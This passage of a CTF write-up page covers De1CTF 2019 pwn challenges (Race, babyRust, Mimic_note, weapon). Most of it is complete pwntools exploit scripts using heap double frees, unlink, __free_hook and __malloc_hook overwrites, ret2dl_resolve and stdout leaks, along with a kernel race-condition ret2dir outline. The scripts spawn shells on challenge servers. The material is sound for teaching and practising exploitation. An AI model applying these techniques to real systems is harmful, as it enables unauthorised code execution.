class="line"></span><br><span class="line">se(&apos;%c&apos;*16+&apos;%&apos;+str(tmp-16)+&apos;c%hn%&apos;+str((163-(tmp%0x100)+0x100)%0x100)+&apos;c%23$hhn\x00&apos;)</span><br><span class="line"></span><br><span class="line">wait()</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">rop = 0x601060+0x200</span><br><span class="line"></span><br><span class="line">write_value(stack,p64(rop)[:6])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line"></span><br><span class="line">prbp = 0x400690</span><br><span class="line">prsp = 0x40082d</span><br><span class="line">adc = 0x4006E8</span><br><span class="line">arsp = 0x0400848</span><br><span class="line">prbx = 0x40082A </span><br><span class="line">call = 0x400810 </span><br><span class="line">stderr = 0x601040 </span><br><span class="line"></span><br><span class="line">payload = p64(arsp)*3</span><br><span class="line">payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)</span><br><span class="line">payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)</span><br><span class="line"></span><br><span class="line">se((&apos;%&apos;+str(0x82d)+&apos;c%23$hn&apos;).ljust(0x200,&apos;\0&apos;)+payload)</span><br><span class="line"></span><br><span class="line">print(hex(stack))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Race"><a href="#Race" class="headerlink" title="Race"></a>Race</h2><h4 id="一、竞态泄露slab地址"><a href="#一、竞态泄露slab地址" class="headerlink" title="一、竞态泄露slab地址"></a>一、竞态泄露slab地址</h4><p>题目很明显就是copy_to_user和copy_from_user时的竞争删除导致的漏洞，为了扩大竞争条件的窗口期需要mmap一块内存，当copy_to_user复制到用户空间时会引发缺页中断，这样可能会导致进程切换。需要注意的是复制的大小不能是8字节，不然再多的删除进程也是没用的，具体可以看copy_to_user的<a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149" target="_blank" rel="noopener">实现</a>。由于本地和服务器环境有一些差别，竞争删除的进程数会有一点不同。</p>
<p>理想的效果：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">test_write</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">copy_to_user</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center">缺页中断</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:left">test_del</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:left">kfree释放buffer</td>
</tr>
<tr>
<td style="text-align:center">copy_to_user</td>
</tr>
</tbody>
</table>
<p>这样就可以顺利拿到slab地址</p>
<h4 id="二、分配大量内存，占位physmap"><a href="#二、分配大量内存，占位physmap" class="headerlink" title="二、分配大量内存，占位physmap"></a>二、分配大量内存，占位physmap</h4><p>就mmap大量地址吧，qemu给了128M内存，进程可以顺利申请64M内存，这样就占了一半的内存，后面有50%的几率跳到控制的<a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">physmap</a>。（实际上找个好一点的偏移基本上100%成功）</p>
<h4 id="三、竞态写释放后的slab-object"><a href="#三、竞态写释放后的slab-object" class="headerlink" title="三、竞态写释放后的slab object"></a>三、竞态写释放后的slab object</h4><p>通过第一步获得slab地址，从而推出physmap的起始地址（这两个区域很接近，或者应该说physmap包含了slab，这点不确定，没深入源码）</p>
<p>为了扩大竞争条件的窗口期，我是通过将猜测的physmap地址直接写入文件（不经过缓冲区，直接写入文件，<a href="https://www.cnblogs.com/muahao/p/7903230.html" target="_blank" rel="noopener">O_DIRECT</a>），然后再mmap映射文件去读。后面流程和竞争读一样，copy_from_user的时候，将buffer删掉，这样就可以改写下一块空闲slab地址，然后接着open(“/dev/ptmx”,O_RDWR);就可以申请tty_struct到可控physmap地址上。</p>
<h4 id="四、查找physmap地址别名"><a href="#四、查找physmap地址别名" class="headerlink" title="四、查找physmap地址别名"></a>四、查找physmap地址别名</h4><p>查找mmap出来的地址，如果不为NULL就代表找到了第三步申请的tty_struct结构体。这样就可以在用户态修改内核分配的tty_struct。</p>
<h4 id="五、tty-struct常规用法"><a href="#五、tty-struct常规用法" class="headerlink" title="五、tty_struct常规用法"></a>五、tty_struct常规用法</h4><p>open(“/dev/ptmx”,O_RDWR);实际上会分配两个tty_struct，主从模式。实际上用户态可控的tty_struct是<a href="https://blog.csdn.net/luckywang1103/article/details/71191821" target="_blank" rel="noopener">pts</a>的（因为第一个tty_struct会分配到删除了的buffer地址，第二个tty_struct才会分配到physmap上），所以还要open(pts_name, O_RDONLY | O_NOCTTY);然后才是常规的ioctl操作。</p>
<p>这里懒得找gadgets，就直接调用set_memory_x设置可执行，后面再跳到shellcode在内核态下执行就好了。</p>
<p>PS:向经典的ret2dir致敬。本来只是打算uaf加ret2dir的，后面写着写着就成伪竞态了。 :)</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/pwn/Race/exp.c" target="_blank" rel="noopener">exp.c</a></p>
<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p>copy_to_user : <a href="https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.0-rc8/source/include/linux/uaccess.h#L149</a></p>
<p>ret2dir : <a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xJDchen/p/6143102.html</a></p>
<p>O_DIRECT : <a href="https://www.cnblogs.com/muahao/p/7903230.html" target="_blank" rel="noopener">https://www.cnblogs.com/muahao/p/7903230.html</a></p>
<h2 id="babyRust"><a href="#babyRust" class="headerlink" title="babyRust"></a>babyRust</h2><p>babyRust 源码：<a href="https://github.com/zjw88282740/babyRust" target="_blank" rel="noopener">https://github.com/zjw88282740/babyRust</a></p>
<p>出题思路来源<a href="https://www.cvedetails.com/cve/CVE-2019-12083/" title="CVE-2019-12083 security vulnerability details" target="_blank" rel="noopener">CVE-2019-12083</a></p>
<p>逆向有点恶心<br>任意读十分简单，通过读got表得到libc基址，观察可发现存在double free的情况，直接写__free_hook<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span><br><span class="line">#p=process(&quot;./babyRust&quot;)</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p=remote(&quot;207.148.126.75&quot;,60001)</span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def edit(name,x,y,z,i):</span><br><span class="line">    p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;input your name:&quot;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(y))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(z))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">p.sendline(&quot;1312&quot;) #Boom-&gt;S</span><br><span class="line">show()</span><br><span class="line">heap_addr=int(p.recvuntil(&quot;, &quot;,drop=True)[2:])-0xa40</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line"></span><br><span class="line">edit(&quot;aaa&quot;,heap_addr+0x2ce0,0,0,0)</span><br><span class="line">show()</span><br><span class="line">p.sendline(&quot;1312&quot;)</span><br><span class="line">#show()</span><br><span class="line">print p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(&quot;bbb &quot;,heap_addr+0xb18,8,8,heap_addr+0xb18)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&quot;3,3,&quot;)</span><br><span class="line">pie_addr=u64(p.recv(8))-239480</span><br><span class="line"></span><br><span class="line">print hex(pie_addr)</span><br><span class="line"></span><br><span class="line">edit(&quot;bbb &quot;,pie_addr+0x3be78,8,8,0)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&quot;3,3,&quot;)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recv(8))-1161904</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">edit(&quot;bbbbb&quot;,heap_addr+0x2d40,2,3,4)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line">p.recvuntil(&quot;4.exit\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;input your name:&quot;)</span><br><span class="line">p.sendline(&quot;z&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(4015))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(5))</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">show()</span><br><span class="line">free_hook=libc_addr+libc.symbols[&apos;__free_hook&apos;]-0x28-8</span><br><span class="line">p.sendline(&quot;1312&quot;)</span><br><span class="line">edit(&quot;\x00&quot;*0x20,free_hook,0,0,0)</span><br><span class="line">one_gadget=libc_addr+0x4f322</span><br><span class="line">p.sendline(&quot;1313&quot;)</span><br><span class="line">edit(&quot;\x00&quot;*0x30,free_hook,2,3,one_gadget)</span><br><span class="line">p.sendline(&quot;1314&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Mimic-note"><a href="#Mimic-note" class="headerlink" title="Mimic_note"></a>Mimic_note</h2><p>题目给了两个二进制文件，一个是32位的，一个是64位的</p>
<p>主要思想是，给定相同的输入，判断32位和64位程序的输入是否相同，假如不相同就直接退出</p>
<p>题目是一个比较简单的堆题</p>
<p>我们首先来看下main函数</p>
<p>可以看到有4个功能</p>
<ol>
<li>new</li>
<li>delete</li>
<li>show</li>
<li>edit</li>
</ol>
<p>其中edit存在一个off by null的漏洞，利用这个漏洞可以unlink，获取任意写</p>
<p>在任意写之后，可以利用一个gadget，将栈转移到bss段上面，进行ROP，这个时候利用ret2dl_resolve就可以打开flag，写到某个note那里，那个note提前设好一个值，假如不相当的话，就会输出what are you trying to do?</p>
<p>下面是exp</p>
<p>这个是预期解，不过因为mimic写得不是很好，有挺多非预期的……..</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import roputils </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_flag(idx,v):</span><br><span class="line">    debug=1</span><br><span class="line"></span><br><span class="line">    #context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">    rop=roputils.ROP(&apos;./mimic_note_32&apos;)</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        p=process(&apos;./mimic&apos;)</span><br><span class="line">        #p=process(&apos;./mimic_note_32&apos;)</span><br><span class="line">        #p=process(&apos;./mimic_note_64&apos;)</span><br><span class="line">        #gdb.attach(p)</span><br><span class="line">    else:</span><br><span class="line">        #p=remote(&apos;127.0.0.1&apos;,9999)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def ru(x):</span><br><span class="line">        return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">    def se(x):</span><br><span class="line">        p.send(x)</span><br><span class="line"></span><br><span class="line">    def sl(x):</span><br><span class="line">        p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def new(sz):</span><br><span class="line">        sl(&apos;1&apos;)</span><br><span class="line">        ru(&apos;size?&apos;)</span><br><span class="line">        sl(str(sz))</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    def delete(idx):</span><br><span class="line">        sl(&apos;2&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    def show(idx):</span><br><span class="line">        sl(&apos;3&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line"></span><br><span class="line">    def edit(idx,content):</span><br><span class="line">        sl(&apos;4&apos;)</span><br><span class="line">        ru(&apos;index ?&apos;)</span><br><span class="line">        sl(str(idx))</span><br><span class="line">        ru(&apos;content?\n&apos;)</span><br><span class="line">        se(content)</span><br><span class="line">        ru(&quot;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">    #unlink attack x86</span><br><span class="line"></span><br><span class="line">    new(0x68)</span><br><span class="line">    new(0x68)</span><br><span class="line">    new(0x94)</span><br><span class="line">    new(0xf8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_chunk = p32(0)+p32(0x91)+p32(0x804a070-0xc)+p32(0x804a070-0x8)</span><br><span class="line">    fake_chunk = fake_chunk.ljust(0x90,&apos;\0&apos;)</span><br><span class="line"></span><br><span class="line">    edit(2,fake_chunk+p32(0x90))</span><br><span class="line"></span><br><span class="line">    delete(3)</span><br><span class="line"></span><br><span class="line">    #ret2dlresolve and blind injection</span><br><span class="line"></span><br><span class="line">    new(0x200)</span><br><span class="line"></span><br><span class="line">    bss = 0x0804a500</span><br><span class="line"></span><br><span class="line">    edit(2,p32(0x100)+p32(0x804A014)+p32(0x98)+p32(bss+0x300)+p32(0x94)+p32(bss)+p32(0x200))</span><br><span class="line">    edit(1,p32(0x80489FA))</span><br><span class="line"></span><br><span class="line">    payload = p32(bss-0x100)+rop.dl_resolve_call(bss+0x60, bss+0x180,0)</span><br><span class="line">    payload += p32(0x8048460)+p32(0x80489F9)+p32(3)+p32(bss+0x300-idx)+p32(idx+1)</span><br><span class="line">    payload += p32(0x080489FB)+p32(bss-0x100)</span><br><span class="line">    payload += p32(0x804893C)</span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(0x60,&apos;\x00&apos;)</span><br><span class="line">    payload += rop.dl_resolve_data(bss+0x60, &apos;open&apos;)</span><br><span class="line">    payload = payload.ljust(0x180,&apos;\x00&apos;)</span><br><span class="line">    payload += &apos;flag&apos;</span><br><span class="line"></span><br><span class="line">    edit(3,payload)</span><br><span class="line"></span><br><span class="line">    edit(2,v+&apos;\0&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sl(&apos;2\x00&apos;+&apos;a&apos;*6+p32(0x80488DE))</span><br><span class="line">    ru(&apos;index ?\n&apos;)</span><br><span class="line">    sl(&apos;3\x00&apos;)</span><br><span class="line">    ru(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line">    show(2)</span><br><span class="line"></span><br><span class="line">    ru(&apos;\n&apos;)</span><br><span class="line">    data = ru(&apos;\n&apos;) </span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    if len(data)&gt;5:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">charset =&apos;&#123;&#125;_&apos;+ string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(40):</span><br><span class="line">    for q in charset:</span><br><span class="line">        if brute_flag(i,q):</span><br><span class="line">            flag+=q</span><br><span class="line">            print(flag)</span><br><span class="line">            if q == &apos;&#125;&apos;:</span><br><span class="line">                exit(0)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<h2 id="weapon"><a href="#weapon" class="headerlink" title="weapon"></a>weapon</h2><p><a href="./docker-enviroment">docker-enviroment</a></p>
<p>this problem have two ways to solve it</p>
<blockquote>
<p>the key to topic is to let a chunk have libc address in fd. and then we use a trick to leak a libc address ,finally use fastbin attack to get shell.</p>
</blockquote>
<h4 id="first"><a href="#first" class="headerlink" title="first"></a>first</h4><p>make a fake 0x80(more than that is ok) chunk and free it .so that we can get libc in fd and then edit the struct of stdout to leak.finally get shell.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def cmd(c):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; \n&quot;,str(c))</span><br><span class="line">def Cmd(c):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,str(c))</span><br><span class="line">def add(size,idx,name=&quot;padding&quot;):</span><br><span class="line">	cmd(1)</span><br><span class="line">	p.sendlineafter(&quot;: &quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">	p.sendafter(&quot;:\n&quot;,name)</span><br><span class="line">def free(idx):</span><br><span class="line">	cmd(2)</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">def edit(idx,name):</span><br><span class="line">	cmd(3)</span><br><span class="line">	p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">	p.sendafter(&quot;:\n&quot;,name)</span><br><span class="line">def Add(size,idx,name=&quot;padding&quot;):</span><br><span class="line">	Cmd(1)</span><br><span class="line">	p.sendlineafter(&quot;: &quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;: &quot;,str(idx))</span><br><span class="line">	p.sendafter(&quot;:&quot;,name)</span><br><span class="line">def Free(idx):</span><br><span class="line">	Cmd(2)</span><br><span class="line">	p.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pwn&apos;)</span><br><span class="line">p=remote(&quot;139.180.216.34&quot;,8888)</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x18,1)</span><br><span class="line">add(0x60,2,p64(0x0)+p64(0x21)+&apos;\x00&apos;*0x18+p64(0x21)*5)</span><br><span class="line">add(0x60,3,p64(0x21)*12)</span><br><span class="line">add(0x60,4)</span><br><span class="line">add(0x60,5)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x18,0,&quot;\x50&quot;)</span><br><span class="line">add(0x18,0,&apos;\x00&apos;*8)</span><br><span class="line">add(0x18,0,&quot;A&quot;)</span><br><span class="line"></span><br><span class="line">add(0x18,0,&apos;GET&apos;)</span><br><span class="line"></span><br><span class="line">edit(2,p64(0x0)+p64(0x91))</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">add(0x18,0)</span><br><span class="line">add(0x60,0,&apos;\xdd\x25&apos;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line">free(2)</span><br><span class="line">free(5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&apos;&apos;)</span><br><span class="line">add(0x60,4,&apos;\x70&apos;)</span><br><span class="line">#</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0)</span><br><span class="line">add(0x60,0,&apos;\x00&apos;*(0x40+3-0x10)+p64(0x1800)+&apos;\x00&apos;*0x19)</span><br><span class="line">p.read(0x40)</span><br><span class="line"></span><br><span class="line">base=u64(p.read(6).ljust(8,&apos;\x00&apos;))-(0x7ffff7dd2600-0x7ffff7a0d000)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line">#raw_input()</span><br><span class="line">libc=ELF(&quot;./pwn&quot;).libc</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,1)</span><br><span class="line">Add(0x18,2)</span><br><span class="line">Free(0)</span><br><span class="line">Free(1)</span><br><span class="line">Free(0)</span><br><span class="line">Add(0x60,0,p64(libc.sym[&apos;__malloc_hook&apos;]+base-35))</span><br><span class="line">Add(0x60,0)</span><br><span class="line">Add(0x60,0)</span><br><span class="line">one=0xf02a4</span><br><span class="line">Add(0x60,0,&apos;\x00&apos;*19+p64(one+base))</span><br><span class="line"></span><br><span class="line">Free(1)</span><br><span class="line">Free(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="second"><a href="#second" class="headerlink" title="second"></a>second</h4><p>when we use scanf to input something .if you input lots of things ,it will malloc a 0x400 chunk to keep it temporarily。if we keep some fastbin when it malloc.it will be put into smallbin.now we also have libc address.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">#p = process(&quot;./weapon&quot;)</span><br><span class="line">p = remote(&quot;139.180.216.34&quot;,8888)</span><br><span class="line">elf = ELF(&quot;./weapon&quot;)</span><br><span class="line">a = elf.libc</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">def create(idx,size,content):</span><br><span class="line">	p.recvuntil(&quot;&gt;&gt; \n&quot;)</span><br><span class="line">	p.sendline(str(1))</span><br><span class="line">	p.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;index: &quot;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&quot;name:&quot;)</span><br><span class="line">	p.send(content)</span><br><span class="line">def 